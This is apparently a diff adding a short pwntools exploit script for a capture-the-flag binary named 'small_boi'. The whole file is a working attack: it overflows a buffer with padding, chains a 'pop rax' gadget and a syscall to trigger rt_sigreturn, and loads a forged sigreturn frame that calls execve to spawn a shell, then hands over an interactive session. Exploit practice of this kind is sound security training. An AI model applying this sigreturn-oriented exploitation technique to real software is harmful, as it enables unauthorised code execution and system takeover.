@@ -1,0 +1,31 @@
+from pwn import *
+
+p = process("./small_boi")
+'''
+p = gdb.debug("./small_boi", gdbscript = 
+
+)
+'''
+
+
+pop_rax = 0x000000000040018a
+syscall = 0x0000000000400185
+ret = pop_rax + 1
+
+context.arch = "amd64"
+
+frame = SigreturnFrame()
+frame.rip = 0x0000000000400185
+frame.rax = 0x3b
+frame.rdi = 0x4001ca
+frame.rsi = 0
+frame.rdx = 0
+
+payload = b"A" * 0x20 + b"B" * 8
+payload += p64(pop_rax) + p64(0x0f)
+payload += p64(syscall)
+payload += bytes(frame)
+
+p.send(payload)
+
+p.interactive()
